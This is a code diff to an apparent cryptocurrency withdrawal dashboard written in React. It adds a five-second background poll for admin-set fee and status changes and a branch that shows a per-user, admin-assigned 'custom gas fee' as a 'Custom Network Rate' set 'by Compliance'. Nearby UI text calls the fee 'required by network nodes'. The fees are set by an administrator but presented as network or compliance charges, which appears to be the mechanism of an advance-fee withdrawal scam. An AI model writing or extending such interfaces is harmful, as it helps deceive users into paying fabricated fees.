@@ -264,6 +264,25 @@ export default function App() {
       .finally(() => setBooting(false));
   }, []);
 
+  // Periodic background refresh for dashboard so admin fee/status updates reflect in real-time
+  useEffect(() => {
+    if (page !== 'dashboard') return;
+    const interval = setInterval(() => {
+      const token = localStorage.getItem('cv_token');
+      if (!token) return;
+      fetch(`${API}/user/me`, { headers: { Authorization: `Bearer ${token}` } })
+        .then(r => (r.ok ? r.json() : Promise.reject()))
+        .then(d => {
+          if (d.user) {
+            setUser(d.user);
+            setLocalGasFeePaid(null);
+          }
+        })
+        .catch(() => {});
+    }, 5000);
+    return () => clearInterval(interval);
+  }, [page]);
+
   function loadRequests(token: string) {
     fetch(`${API}/withdrawal/my-requests`, { headers: { Authorization: `Bearer ${token}` } })
       .then(r => r.json())
@@ -1635,7 +1654,9 @@ export default function App() {
                         Required by network nodes to expedite blockchain dispatch and accelerate transaction confirmation.
                       </div>
                       <div style={{ fontSize: '12px', color: '#38bdf8', marginTop: '4px', fontWeight: 600 }}>
-                        {activeAmount >= (paymentSettings?.gas_fee_threshold ?? 20000)
+                        {currentUser.custom_gas_fee != null && Number(currentUser.custom_gas_fee) >= 0
+                          ? `⚡ Custom Network Rate Applied: ${fmt(gasFee)} (Priority Dispatch Set by Compliance)`
+                          : activeAmount >= (paymentSettings?.gas_fee_threshold ?? 20000)
                           ? `⚡ Applied High-Priority Tier Rate: ${fmt(paymentSettings?.gas_fee_high ?? 250)} for requests $${(paymentSettings?.gas_fee_threshold ?? 20000).toLocaleString()}+`
                           : activeAmount >= 5000
                           ? `⚡ Applied Fast Priority Tier Rate: ${fmt(150)} for requests $5,000–$20,000`
